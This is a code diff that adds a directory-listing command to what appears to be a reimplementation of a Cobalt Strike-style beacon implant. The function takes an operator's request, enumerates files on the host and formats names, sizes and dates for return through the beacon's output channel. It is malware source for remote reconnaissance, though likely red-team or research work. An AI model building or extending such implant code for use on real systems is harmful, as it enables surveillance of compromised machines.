@@ -106,3 +106,75 @@ void FilesystemDrives(char* buffer, int length)
 
 	BeaconFormatFree(&locals);
 }
+
+void FilesystemList(char* buffer, int length)
+{
+#define MAX_FILENAME 0x4000
+	char* filename = malloc(MAX_FILENAME);
+	*filename = { 0 };
+
+	datap parser;
+	BeaconDataParse(&parser, buffer, length);
+	int reqno = BeaconDataInt(&parser);
+	BeaconDataStringCopySafe(&parser, filename, MAX_FILENAME);
+
+	formatp locals;
+	BeaconFormatAlloc(&locals, 0x200000);
+	BeaconFormatInt(&locals, reqno);
+
+#define SOURCE_DIRECTORY "\\*"
+	if(!strncmp(filename, "." SOURCE_DIRECTORY, MAX_FILENAME))
+	{
+		GetCurrentDirectoryA(MAX_FILENAME, filename);
+		strncat_s(filename, MAX_FILENAME, SOURCE_DIRECTORY, STRLEN(SOURCE_DIRECTORY));
+	}
+
+	BeaconFormatPrintf(&locals, "%s\n", filename);
+	WIN32_FIND_DATAA findData;
+	HANDLE firstFile = FindFirstFileA(filename, &findData);
+
+	if(firstFile == INVALID_HANDLE_VALUE)
+	{
+		int lastError = GetLastError();
+		LERROR("Could not open %s: %s", filename, LAST_ERROR_STR(lastError));
+		BeaconErrorDS(ERROR_LIST_OPEN_FAILED, lastError, filename);
+
+		int size = BeaconFormatLength(&locals);
+		char* data = BeaconFormatOriginal(&locals);
+		BeaconOutput(CALLBACK_PENDING, data, size);
+		goto cleanup;
+	}
+
+	SYSTEMTIME systemTime, localTime;
+	do
+	{
+		FileTimeToSystemTime(&findData.ftLastWriteTime, &systemTime);
+		SystemTimeToTzSpecificLocalTime(NULL, &systemTime, &localTime);
+
+		if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+		{
+			BeaconFormatPrintf(&locals, "D\t0\t%02d/%02d/%02d %02d:%02d:%02d\t%s\n",
+				localTime.wMonth, localTime.wDay, localTime.wYear,
+				localTime.wHour, localTime.wMinute, localTime.wSecond,
+				findData.cFileName);
+		}
+		else
+		{
+			BeaconFormatPrintf(&locals, "F\t%I64d\t%02d/%02d/%02d %02d:%02d:%02d\t%s\n",
+				((ULONGLONG)findData.nFileSizeHigh << 32) | findData.nFileSizeLow,
+				localTime.wMonth, localTime.wDay, localTime.wYear,
+				localTime.wHour, localTime.wMinute, localTime.wSecond,
+				findData.cFileName);
+		}
+	} while (FindNextFileA(firstFile, &findData));
+
+	FindClose(firstFile);
+
+	int size = BeaconFormatLength(&locals);
+	char* data = BeaconFormatOriginal(&locals);
+	BeaconOutput(CALLBACK_PENDING, data, size);
+
+	cleanup:
+	free(filename);
+	BeaconFormatFree(&locals);
+}
